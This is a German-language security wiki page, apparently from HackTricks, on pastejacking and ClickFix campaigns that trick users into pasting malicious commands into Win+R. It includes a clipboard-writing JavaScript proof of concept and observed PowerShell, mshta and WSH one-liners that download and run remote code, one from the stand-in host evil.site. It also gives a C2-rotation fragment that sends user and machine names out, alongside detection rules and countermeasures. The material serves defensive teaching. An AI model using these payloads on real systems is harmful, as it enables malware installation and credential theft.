# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Füge niemals etwas ein, das du nicht selbst kopiert hast." – alter, aber immer noch gültiger Ratschlag

## Überblick

Clipboard hijacking – auch bekannt als *pastejacking* – macht sich die Tatsache zunutze, dass Benutzer routinemäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) legt programmatisch angreiferkontrollierten Text in die Systemzwischenablage. Opfer werden in der Regel durch sorgfältig gestaltete Social-Engineering-Anweisungen dazu verleitet, **Win + R** (Ausführen-Dialog), **Win + X** (Quick Access / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage einzufügen (*paste*), wodurch sofort beliebige Befehle ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Web-Content-Sicherheitskontrollen, die Anhänge, Makros oder direkte Befehlsausführung überwachen. Der Angriff ist daher beliebt in Phishing-Kampagnen, die Commodity-Malware-Familien wie NetSupport RAT, Latrodectus loader oder Lumma Stealer ausliefern.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen nutzten `document.execCommand('copy')`, neuere setzen auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Der ClickFix / ClearFake-Ablauf

1. Der Benutzer besucht eine typosquatted oder kompromittierte Seite (z. B. `docusign.sa[.]com`)
2. Injiziertes **ClearFake** JavaScript ruft einen `unsecuredCopyToClipboard()` Helper auf, der heimlich einen Base64-kodierten PowerShell-Einzeiler in die Zwischenablage speichert.
3. HTML-Anweisungen fordern das Opfer auf: *“Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie Enter, um das Problem zu beheben.”*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei plus eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt zusätzliche Stufen, injiziert Shellcode und installiert Persistenz (z. B. scheduled task) – führt schließlich NetSupport RAT / Latrodectus / Lumma Stealer aus.

### Beispielhafte NetSupport RAT-Kette
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimer Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst APIs dynamisch mit **GetProcAddress**, lädt zwei Binaries (`data_3.bin`, `data_4.bin`) über **curl.exe** herunter, entschlüsselt sie mithilfe eines rollierenden XOR-Keys `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader in **cscript.exe** aus
3. Holt eine MSI payload → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer über MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mittels `extrac32` und Datei-Konkatenation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das browser credentials an `sumeriavgv.digital` exfiltrates.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Dateidownloads und fordern Opfer auf, einen one‑liner einzufügen, der JavaScript via WSH abruft und ausführt, sich persistent macht und die C2 täglich rotiert. Beispiel beobachtete Kette:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Hauptmerkmale
- Obfuskierte URL wird zur Laufzeit umgekehrt, um eine oberflächliche Inspektion zu verhindern.
- JavaScript sorgt für Persistenz über eine Startup LNK (WScript/CScript) und wählt den C2 nach dem aktuellen Tag aus – das ermöglicht schnelle Domain-Rotation.

Minimales JS-Fragment zur Rotation von C2s nach Datum:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die nächste Stufe setzt häufig einen Loader ein, der Persistenz herstellt und einen RAT (z. B. PureHVNC) nachlädt, oft wird TLS an ein hartkodiertes Zertifikat gebunden und der Traffic in Chunks aufgeteilt.

Erkennungsansätze speziell für diese Variante
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Start‑Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, die WScript/CScript mit einem JS‑Pfad unter `%TEMP%`/`%APPDATA%` aufruft.
- Registry/RunMRU- und Kommandozeilen‑Telemetrie, die `.split('').reverse().join('')` oder `eval(a.responseText)` enthält.
- Wiederholte `powershell -NoProfile -NonInteractive -Command -` Aufrufe mit großen stdin‑Payloads, um lange Skripte ohne lange Kommandozeilen zuzuliefern.
- Geplante Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` ausführen, unter einem updater‑ähnlichen Task/Pfad (z. B. `\GoogleSystem\GoogleUpdater`).

Threat Hunting
- Täglich rotierende C2-Hostnames und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korrelation von Clipboard‑Write‑Ereignissen, gefolgt von einem Win+R‑Einfügen und anschließender sofortiger Ausführung von `powershell.exe`.

Blue‑Teams können Clipboard‑, Prozess‑Erstellungs‑ und Registry‑Telemetrie kombinieren, um pastejacking‑Missbrauch zu lokalisieren:

* Windows-Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` enthält eine Historie der **Win + R** Befehle – auf ungewöhnliche Base64 / obfuskierte Einträge achten.
* Security Event ID **4688** (Process Creation), bei dem `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** für Dateierstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder in temporären Ordnern kurz vor dem verdächtigen 4688‑Ereignis.
* EDR‑Clipboard‑Sensoren (falls vorhanden) – korrelieren Sie `Clipboard Write`, gefolgt unmittelbar von einem neuen PowerShell‑Prozess.

## Gegenmaßnahmen

1. Browser‑Härtung – Clipboard‑Schreibzugriff deaktivieren (`dom.events.asyncClipboard.clipboardItem` etc.) oder eine Benutzeraktion verlangen.
2. Security Awareness – Anwender schulen, sensible Befehle *einzugeben* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige One‑Liner zu blockieren.
4. Netzwerk‑Kontrollen – ausgehende Anfragen zu bekannten pastejacking‑ und Malware‑C2‑Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** nutzt oft denselben ClickFix‑Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referenzen

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
